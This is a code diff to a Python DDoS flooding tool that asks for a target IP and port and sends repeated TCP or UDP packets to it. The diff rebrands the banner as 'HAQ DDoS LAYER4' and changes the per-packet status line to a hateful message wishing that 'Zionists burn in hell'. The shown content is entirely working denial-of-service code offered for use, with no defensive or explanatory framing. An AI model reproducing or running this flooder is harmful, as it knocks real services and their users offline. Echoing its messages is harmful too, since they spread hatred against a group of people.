@@ -4,8 +4,8 @@ import random
 import socket
 import threading
 
-print("--> LAYER 4 ATTACK <--")
-print("#-- TCP/UDP FLOOD --#")
+print("== HAQ DDoS LAYER4 ==")
+print("# TCP/UDP FLOOD #")
 ip = str(input(" IP :"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
@@ -20,7 +20,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" HALO DEK !!!")
+			print(i +" May the Zionists burn in hell !!!")
 		except:
 			print("[!] Error!!!")
 
@@ -34,7 +34,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" HALO DEK !!!")
+			print(i +" May the Zionists burn in hell !!!")
 		except:
 			s.close()
 			print("[*] Error")
